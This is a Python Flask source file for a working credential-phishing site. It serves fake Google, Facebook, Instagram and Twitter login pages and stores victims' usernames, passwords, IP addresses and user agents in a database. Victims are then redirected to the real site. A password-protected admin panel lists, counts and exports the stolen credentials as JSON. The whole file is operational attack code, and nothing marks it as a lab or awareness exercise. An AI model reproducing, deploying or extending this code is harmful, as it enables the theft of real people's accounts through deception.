from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os
import json
import logging
from functools import wraps

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phishing_data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize database
db = SQLAlchemy(app)

# Define database models
class Credentials(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    platform = db.Column(db.String(50), nullable=False)
    username = db.Column(db.String(100), nullable=False)
    password = db.Column(db.String(100), nullable=False)
    ip_address = db.Column(db.String(50))
    user_agent = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<Credentials {self.platform}:{self.username}>'

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("phishing.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Create database tables
with app.app_context():
    db.create_all()

# Login required decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session or not session['admin_logged_in']:
            flash('Please log in to access this page', 'danger')
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login/<platform>', methods=['GET', 'POST'])
def login(platform):
    # Check if platform is valid
    valid_platforms = ['google', 'facebook', 'instagram', 'twitter']
    if platform.lower() not in valid_platforms:
        return redirect(url_for('index'))

    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        if username and password:
            # Log the attempt
            logger.info(f"Login attempt - Platform: {platform}, Username: {username}, IP: {request.remote_addr}")

            # Additional data to collect
            additional_data = {
                'headers': dict(request.headers),
                'cookies': dict(request.cookies),
                'form_data': dict(request.form),
                'referrer': request.referrer
            }

            # Store credentials in database
            new_credentials = Credentials(
                platform=platform,
                username=username,
                password=password,
                ip_address=request.remote_addr,
                user_agent=request.user_agent.string
            )
            db.session.add(new_credentials)
            db.session.commit()

            # Redirect to success page or actual platform
            return redirect(url_for('success', platform=platform))

    # Render the appropriate template based on the platform
    return render_template(f'{platform.lower()}.html')

@app.route('/success/<platform>')
def success(platform):
    # This page can redirect to the actual platform or show a custom message
    redirect_urls = {
        'google': 'https://www.google.com',
        'facebook': 'https://www.facebook.com',
        'instagram': 'https://www.instagram.com',
        'twitter': 'https://twitter.com'
    }

    return render_template('success.html', platform=platform, redirect_url=redirect_urls.get(platform.lower()))

@app.route('/admin')
@login_required
def admin():
    # Admin panel to view captured credentials
    credentials = Credentials.query.order_by(Credentials.timestamp.desc()).all()

    # Count statistics
    platform_stats = {
        'google': Credentials.query.filter_by(platform='google').count(),
        'facebook': Credentials.query.filter_by(platform='facebook').count(),
        'instagram': Credentials.query.filter_by(platform='instagram').count(),
        'twitter': Credentials.query.filter_by(platform='twitter').count(),
        'total': Credentials.query.count()
    }

    return render_template('admin.html', credentials=credentials, stats=platform_stats)

@app.route('/admin/export')
@login_required
def export_data():
    # Export all credentials as JSON
    credentials = Credentials.query.order_by(Credentials.timestamp.desc()).all()

    # Convert to list of dictionaries
    result = []
    for cred in credentials:
        result.append({
            'id': cred.id,
            'platform': cred.platform,
            'username': cred.username,
            'password': cred.password,
            'ip_address': cred.ip_address,
            'user_agent': cred.user_agent,
            'timestamp': cred.timestamp.strftime('%Y-%m-%d %H:%M:%S')
        })

    return jsonify(result)

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    # If already logged in, redirect to admin panel
    if 'admin_logged_in' in session and session['admin_logged_in']:
        return redirect(url_for('admin'))

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Hardcoded admin credentials (in a real app, use proper authentication)
        if username == 'cyberwolf' and password == 'cyberwolf123':
            session['admin_logged_in'] = True
            logger.info(f"Admin login successful from IP: {request.remote_addr}")
            flash('Login successful', 'success')
            return redirect(url_for('admin'))
        else:
            logger.warning(f"Failed admin login attempt - Username: {username}, IP: {request.remote_addr}")
            flash('Invalid credentials', 'danger')

    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    flash('You have been logged out', 'success')
    return redirect(url_for('admin_login'))

@app.route('/admin/delete/<int:credential_id>', methods=['POST'])
@login_required
def delete_credential(credential_id):
    credential = Credentials.query.get_or_404(credential_id)
    db.session.delete(credential)
    db.session.commit()
    flash('Credential deleted successfully', 'success')
    return redirect(url_for('admin'))

if __name__ == '__main__':
    app.run(debug=True)
